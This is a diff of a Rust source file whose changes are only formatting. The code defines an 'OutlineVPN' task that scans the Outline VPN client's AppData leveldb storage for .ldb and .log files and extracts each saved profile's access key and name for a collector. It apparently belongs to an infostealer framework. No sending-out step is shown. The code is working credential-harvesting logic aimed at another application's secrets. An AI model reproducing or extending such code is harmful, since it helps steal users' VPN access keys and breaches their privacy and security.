@@ -19,7 +19,7 @@ struct Profile {
     #[new(into)]
     access_key: Arc<str>,
     #[new(into)]
-    name: Arc<str>
+    name: Arc<str>,
 }
 
 impl<C: Collector, F: FileSystem> Task<C, F> for OutlineVPN {
@@ -28,14 +28,16 @@ impl<C: Collector, F: FileSystem> Task<C, F> for OutlineVPN {
     fn run(&self, parent: &Path, filesystem: &F, collector: &C) {
         let root_path = Path::appdata() / "Outline" / "Local Storage" / "leveldb";
 
-        let Some(files) = StorageFileSystem.list_files_filtered(
-            root_path,
-            &|file| file.extension().map(|ext| ext.ends_with("ldb") || ext.ends_with("log")).unwrap_or(false)
-        ) else {
-            return
+        let Some(files) = StorageFileSystem.list_files_filtered(root_path, &|file| {
+            file.extension()
+                .map(|ext| ext.ends_with("ldb") || ext.ends_with("log"))
+                .unwrap_or(false)
+        }) else {
+            return;
         };
 
-        let mut all_profiles: Vec<Profile> = files.into_iter()
+        let mut all_profiles: Vec<Profile> = files
+            .into_iter()
             .filter_map(|path| find_json_and_extract(StorageFileSystem, path))
             .flatten()
             .collect();
@@ -59,7 +61,7 @@ impl<C: Collector, F: FileSystem> Task<C, F> for OutlineVPN {
 fn find_json_and_extract<R, F>(fs: R, path: Path) -> Option<Vec<Profile>>
 where
     R: AsRef<F>,
-    F: FileSystem
+    F: FileSystem,
 {
     let file = fs.as_ref().read_file(path).ok()?;
     let raw_json = find_json_array(&file)?;
@@ -117,10 +119,13 @@ fn find_json_array(bytes: &[u8]) -> Option<&[u8]> {
 }
 
 fn extract_profiles(json: Value) -> Option<Vec<Profile>> {
-    json.as_array()?.iter().map(|profile| {
-        Some(Profile::new(
-            profile.get("accessKey")?.as_string()?.clone(),
-            profile.get("name")?.as_string()?.clone(),
-        ))
-    }).collect()
+    json.as_array()?
+        .iter()
+        .map(|profile| {
+            Some(Profile::new(
+                profile.get("accessKey")?.as_string()?.clone(),
+                profile.get("name")?.as_string()?.clone(),
+            ))
+        })
+        .collect()
 }
